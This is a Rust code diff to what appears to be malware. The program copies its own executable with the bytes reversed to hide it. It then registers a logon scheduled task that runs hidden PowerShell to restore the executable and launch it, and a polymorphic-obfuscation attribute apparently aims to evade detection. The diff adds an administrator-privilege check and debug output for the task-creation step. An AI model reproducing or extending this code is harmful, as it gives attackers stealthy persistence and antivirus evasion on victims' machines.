@@ -27,10 +27,16 @@ fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
     }
     wide
 }
+use is_elevated::is_elevated;
+
 #[polymorph(fn_len = 10, garbage = true)]
 fn main() {
     let startup = true;
     if startup {
+        if !is_elevated() {
+            println!("This program requires administrator privileges to run.");
+            return;
+        }
         if let Ok(current_exe) = env::current_exe() {
             if let Ok(mut exe_contents) = fs::read(&current_exe) {
                 exe_contents.reverse();
@@ -41,7 +47,7 @@ fn main() {
                             "$bytes = [System.IO.File]::ReadAllBytes('{0}'); [System.Array]::Reverse($bytes); [System.IO.File]::WriteAllBytes('{0}.exe', $bytes); Start-Process '{0}.exe'",
                             dest_path
                         );
-                        let _ = Command::new("schtasks")
+                        let output = Command::new("schtasks")
                             .args(&[
                                 "/create",
                                 "/sc", "onlogon",
@@ -49,7 +55,10 @@ fn main() {
                                 "/tr", &format!("powershell.exe -WindowStyle hidden -Command \"{}\"", ps_command),
                                 "/f",
                             ])
-                            .output();
+                            .output()
+                            .expect("failed to execute process");
+                        println!("status: {}", String::from_utf8_lossy(&output.stdout));
+                        println!("error: {}", String::from_utf8_lossy(&output.stderr));
                     }
                 }
             }
